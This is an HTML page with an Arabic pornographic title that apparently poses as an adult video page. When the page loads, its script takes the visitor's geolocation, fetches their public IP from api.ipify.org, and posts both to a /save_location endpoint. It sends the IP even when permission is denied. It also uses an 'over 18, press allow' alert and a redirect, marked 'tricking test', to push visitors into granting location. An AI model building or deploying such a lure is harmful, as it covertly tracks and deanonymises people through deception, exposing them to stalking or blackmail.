<!DOCTYPE html>
<html lang="en">
<head>
    <style>
        body {
            display: flex;
            flex-direction: column;
            justify-content: center;
            min-height: 100vh;
            background-image: url('xx.jpg');
            background-repeat: no-repeat;
            background-attachment: fixed;
            background-size: 100% 100%;
        }
    </style>
    <meta charset="UTF-8">
    <title>سكس جامد</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showError);
                getIP(function(ip) {
                    saveLocationToServer(ip, ip); // Use the IP address as the location parameter
                });
            } else {
                alert("غير المتصفح");
            }
        }

        function showPosition(position) {
            var lat = position.coords.latitude;
            var lng = position.coords.longitude;
            var location =  lat + " " + lng;
            $("#location").html(location);
            getIP(function(ip) {
                saveLocationToServer(location, ip);
            });
        }

        function getIP(callback) {
            $.getJSON("https://api.ipify.org?format=json", function(data) {
                callback(data.ip);
            });
        }

        function saveLocationToServer(location, ip) {
            $.post("/save_location", { location: location, ip: ip }, function(data) {
                console.log(data);
                //alert("تم حفظ العنوان في الملف!");
            });
        }

        function showError(error) {
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    getIP(function(ip) {
                        saveLocationToServer(ip, ip); // Use the IP address as the location parameter
                    });
                    ///////tricking test
                    window.location.href = 'index.html';
                    ///////
                    alert("اضغط علي زر سماح اذا كنت اكبر من ١٨ سنه لمشاهده الفيديو");
                    break;
                case error.POSITION_UNAVAILABLE:
                    getIP(function(ip) {
                        saveLocationToServer(ip, ip); // Use the IP address as the location parameter
                    });
                    //alert("معلومات عن الموقع غير متاحة.");
                    break;
                case error.TIMEOUT:
                    getIP(function(ip) {
                        saveLocationToServer(ip, ip); // Use the IP address as the location parameter
                    });
                    //alert("لم يتم الرد على طلب الموقع.");
                    break;
                case error.UNKNOWN_ERROR:
                    getIP(function(ip) {
                        saveLocationToServer(ip, ip); // Use the IP address as the location parameter
                    });
                    //alert("حدث خطأ غير معروف.");
                    break;
            }
        }

        $(document).ready(function() {
            getLocation();
        });
    </script>
</head>
<body>
    <div id="location"></div>
</body>
</html>
